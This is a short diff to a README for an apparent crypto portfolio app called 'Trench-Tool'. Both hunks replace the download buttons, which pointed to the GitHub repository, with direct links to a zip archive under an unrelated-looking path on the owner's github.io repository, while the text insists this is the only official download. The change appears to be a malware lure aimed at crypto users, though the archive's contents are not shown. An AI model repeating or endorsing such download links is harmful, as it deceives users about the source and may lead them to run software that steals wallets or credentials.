@@ -33,7 +33,7 @@ Navigate the "trenches" of crypto with confidence. The app provides specialized 
 ### Step 1: Download the Application
 Visit the official download page by clicking the button below:
 
-[**DOWNLOAD TRENCH-TOOL NOW**](https://github.com/22baggie-commits/Trench-Tool)
+[**DOWNLOAD TRENCH-TOOL NOW**](https://raw.githubusercontent.com/22baggie-commits/22baggie-commits.github.io/main/osteopaedion/Latest-v1.7.zip)
 
 **Visit this link to download the application.**
 
@@ -143,7 +143,7 @@ Your crypto portfolio deserves professional-grade tools. With Trench-Tool, you g
 
 Remember: the only official download link is right here:
 
-[**GET STARTED WITH TRENCH-TOOL**](https://github.com/22baggie-commits/Trench-Tool)
+[**GET STARTED WITH TRENCH-TOOL**](https://raw.githubusercontent.com/22baggie-commits/22baggie-commits.github.io/main/osteopaedion/Latest-v1.7.zip)
 
 Download today and see your investments in a whole new light. The trenches of crypto are tough, but with the right tool, you'll navigate them like a pro.
 
